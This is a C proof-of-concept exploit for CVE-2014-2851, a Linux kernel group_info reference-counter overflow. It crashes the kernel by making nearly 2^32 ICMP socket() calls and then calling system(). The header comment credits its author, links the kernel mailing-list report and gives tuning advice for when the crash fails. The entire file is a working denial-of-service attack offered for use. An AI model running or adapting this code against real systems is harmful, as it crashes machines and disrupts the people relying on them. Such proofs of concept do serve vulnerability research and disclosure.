/*
 * DoS poc for CVE-2014-2851
 * Linux group_info refcounter overflow memory corruption
 *
 * https://lkml.org/lkml/2014/4/10/736
 *
 * @Tohmaxx - http://thomaspollet.blogspot.be
 *
 * If the app doesn't crash your system, try a different count (argv[1])
 * Execution takes a while because 2^32 socket() calls
 *
 */
 
#include <arpa/inet.h>
#include <stdio.h>
#include <sys/socket.h>
int main(int argc, char *argv[]) {
    int i ;
    struct sockaddr_in saddr;
    unsigned count = (1UL<<32) - 20 ;
    if(argc >= 2){
        // Specify count
        count = atoi(argv[1]);
    }
    printf("count 0x%x\n",count);
    for(i = 0 ; (unsigned)i < count;i++ ){
        socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
        if ( i % ( 1 << 22 ) == 0 )
            printf("%i \n",i);
    }
    //Now make it wrap and crash:
    system("/bin/echo bye bye");
}

